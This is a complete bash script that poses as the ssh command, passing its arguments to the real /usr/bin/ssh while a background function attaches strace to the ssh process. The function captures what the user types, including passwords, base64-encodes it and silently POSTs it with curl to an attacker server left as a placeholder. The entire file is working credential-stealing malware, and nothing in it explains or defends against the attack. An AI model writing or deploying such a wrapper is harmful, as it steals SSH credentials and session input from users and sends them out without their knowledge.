#!/bin/bash
ssh_params=$@

get_ssh_pid() {
	ps aux |
	egrep "/usr/bin/ssh\s$ssh_params" |
	grep -v grep |
	awk {'print $2'}
} 

capt() {
	ssh_pid=$(get_ssh_pid)
	raw_data=$(strace -f -p $ssh_pid -e trace=read 2>&1)
	data=$(
		echo -n $raw_data |
		perl -ne'print "$1" while /read\(4,\s"(.{1,6})",/g' |
		sed -E 's/\\n|\\r/\n/g' |
		base64 -w0
	)

	if [ -n "$data" ]; then
	  curl -X POST -s -d "$(echo -n $ssh_params | base64 -w0)" -d "$data" http://[your server] &> /dev/null
	fi	
}
capt &
/usr/bin/ssh $ssh_params


 

